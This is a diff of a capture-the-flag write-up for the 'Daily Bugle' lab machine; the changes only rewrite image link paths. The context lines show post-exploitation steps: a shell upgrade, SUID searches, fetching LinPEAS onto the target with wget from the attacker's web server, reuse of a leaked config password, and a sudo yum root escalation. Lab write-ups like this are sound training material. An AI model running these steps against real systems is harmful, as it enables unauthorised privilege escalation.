@@ -104,29 +104,29 @@ Now set up a netcat listener and navigate to `http://10.10.76.10/templates/beez3
 Let's start by upgrading our shell with `python -c 'import pty; pty.spawn("/bin/bash")'
 `. Looking around the file system, we find a directory belonging to `jjameson`, which we don't seem to have access to. Let's try escalating our privilege. Using `find / -perm -u=s -type f 2>/dev/null` to look for files with the SUID bit set, we find some candidates.
  
-![83e467cfd5af8ddef71a1a5ca54f5986.png](:/ef6fef1754134cef922e9b441d0216f3)
+![83e467cfd5af8ddef71a1a5ca54f5986.png](/Daily%20Bugle/_resources/83e467cfd5af8ddef71a1a5ca54f5986.png)
  
 At this point, we check [GTFObins](https://gtfobins.github.io/) to see if we can leverage any of the binaries we found in our search. It doesn't look like this is the right approach. Let's instead use [LinPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20220717) to search for possible privilege escalation methods on the target machine. Download the linpeas.sh file onto the attacking machine, spin up a webserver with `python3 -m http.server`, and download it onto the target machine using `wget <attacking IP>:8000/linpeas.sh`.
  
-![def636cb01192ace178966359de736d8.png](:/ba4a4c8d22f5415d9a1d9221bfed94ab)
+![def636cb01192ace178966359de736d8.png](/Daily%20Bugle/_resources/def636cb01192ace178966359de736d8.png)
  
 Here I saved the file to the `/tmp` directory so that I don't have to worry about write permissions.
  
-![c394d08ab7b3fd4ae59b407365d2a84b.png](:/49124ee91b074e2db96e3c2fd8c77583)
+![c394d08ab7b3fd4ae59b407365d2a84b.png](/Daily%20Bugle/_resources/c394d08ab7b3fd4ae59b407365d2a84b.png)
  
 Now use `chmod +x linpeas.sh` to mark the file as executable, then run it with `./linpeas.sh`. We find a password in a public PHP config file.
  
-![1a34e49fbe938a3d2f25ec3018589374.png](:/a6a1fd03e1814f36bcdd8099d535919d)
+![1a34e49fbe938a3d2f25ec3018589374.png](/Daily%20Bugle/_resources/1a34e49fbe938a3d2f25ec3018589374.png)
  
 Earlier we found a user named jjameson, so we can try using the password we just found so switch into his account.
  
-![82bbb48b299ce44bf1c3993fad8b731e.png](:/5cc7bd5d61604f0e8e7e8296088f3c80)
+![82bbb48b299ce44bf1c3993fad8b731e.png](/Daily%20Bugle/_resources/82bbb48b299ce44bf1c3993fad8b731e.png)
  
 Success! Navigating to jjameson's home directory gives us the `user.txt` flag.
 
 Now we look for a way to escalate our privilege to obtain the root flag. Using `sudo -l` tells us that jjameson can run the yum binary with sudo privileges.
  
-![23809e8f1de19246829b7a180af6c061.png](:/2767ac94131442fc826577a098d2c331)
+![23809e8f1de19246829b7a180af6c061.png](/Daily%20Bugle/_resources/23809e8f1de19246829b7a180af6c061.png)
  
 Going back to [GTFOBins](https://gtfobins.github.io/gtfobins/yum/#sudo), we see that yum does not drop elevated privileges when run as sudo. We can spawn a root shell with the following commands:
 
@@ -160,8 +160,8 @@ sudo yum -c $TF/x --enableplugin=y
 
 As promised, we get a shell with root access which we then use to quickly find the `root.txt` flag.
   
-![ad5d66d1a634cc31982f20b70c324841.png](:/cdd46c7f57164638b8ecda9eed6472e9)
+![ad5d66d1a634cc31982f20b70c324841.png](/Daily%20Bugle/_resources/ad5d66d1a634cc31982f20b70c324841.png)
 
-![0b2f3894eda28b03b1003c5bad1b1f2c.png](:/0301af5c6f82486da92af6fb437637af)
+![0b2f3894eda28b03b1003c5bad1b1f2c.png](/Daily%20Bugle/_resources/0b2f3894eda28b03b1003c5bad1b1f2c.png)
 
 </center>
